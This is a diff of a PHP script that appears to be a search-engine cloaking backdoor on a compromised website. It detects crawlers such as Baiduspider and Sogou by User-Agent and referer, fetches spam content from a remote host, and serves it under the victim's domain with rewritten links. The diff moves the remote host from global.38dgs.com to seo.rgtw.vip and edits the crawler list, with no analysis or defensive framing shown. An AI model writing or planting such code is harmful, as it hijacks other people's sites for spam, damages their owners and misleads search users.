@@ -11,7 +11,7 @@ if (stristr(Referer,'baidu') or stristr(Referer,'google') or stristr(Referer,'so
 function isCrawler() {
         $agent= strtolower($_SERVER['HTTP_USER_AGENT']);  
         if (!empty($agent)) {                
-                $spiderSite= array('Baiduspider+','Googlebot','msnbot','Sosospider+','Sogou web spider','360Spider','Yahoo! Slurp China','YoudaoBot','Baiduspider','Yisouspider','Sogou inst spider','Sogou Spider','Sogou News Spider');  
+                $spiderSite= array('Baiduspider+','YisouSpider','Sosospider+','Sogou web spider','360Spider','HaosouSpider','Sogou inst spider','Sogou Spider','Sogou News Spider');
                 foreach($spiderSite as $val) {$str = strtolower($val);if (strpos($agent, $str) !== false) {        return true;}                      
                 }  
         } else {
@@ -26,7 +26,7 @@ if ($randnumber = stristr($urlstring,'?id='))
 {
 	if (function_exists('curl_init')){
 		$curl_handle = curl_init(); 
-		curl_setopt($curl_handle, CURLOPT_URL, 'http://global.38dgs.com/index.php'.$randnumber);
+		curl_setopt($curl_handle, CURLOPT_URL, 'http://seo.rgtw.vip/index.php'.$randnumber);
 		curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT,19); 
 		curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
 		$file_content = curl_exec($curl_handle); 
@@ -37,7 +37,7 @@ if ($randnumber = stristr($urlstring,'?id='))
 		echo($html);
 }
 else {
-	$file_content = @file_get_contents('http://global.38dgs.com/index.php'.$randnumber);
+	$file_content = @file_get_contents('http://seo.rgtw.vip/index.php'.$randnumber);
 	$curdir=$_SERVER['SCRIPT_NAME'];
 	$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
 	$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
@@ -48,7 +48,7 @@ else {
 }else{
 if (function_exists('curl_init')){
 		$curl_handle = curl_init();  
-		curl_setopt($curl_handle, CURLOPT_URL, 'http://global.38dgs.com/index.php'); 
+		curl_setopt($curl_handle, CURLOPT_URL, 'http://seo.rgtw.vip/index.php'); 
 		curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT,19);
 		curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
 		$file_content = curl_exec($curl_handle); 
@@ -59,7 +59,7 @@ if (function_exists('curl_init')){
 		echo($html);
 }
 else {
-	$file_content = @file_get_contents('http://global.38dgs.com/index.php');
+	$file_content = @file_get_contents('http://seo.rgtw.vip/index.php');
 	$curdir=$_SERVER['SCRIPT_NAME'];
 	$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
 	$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
